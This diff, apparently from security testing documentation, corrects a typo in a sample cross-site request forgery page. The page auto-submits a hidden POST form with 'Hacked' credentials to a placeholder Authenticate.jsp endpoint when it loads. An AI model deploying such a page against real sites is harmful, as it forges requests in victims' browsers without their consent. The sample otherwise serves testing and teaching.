@@ -122,7 +122,7 @@ In case of POST, the following sample can be used.
 <html>
 <body onload='document.CSRF.submit()'>
 
-<form action='http://tagetWebsite/Authenticate.jsp' method='POST' name='CSRF'>
+<form action='http://targetWebsite/Authenticate.jsp' method='POST' name='CSRF'>
     <input type='hidden' name='name' value='Hacked'>
     <input type='hidden' name='password' value='Hacked'>
 </form>
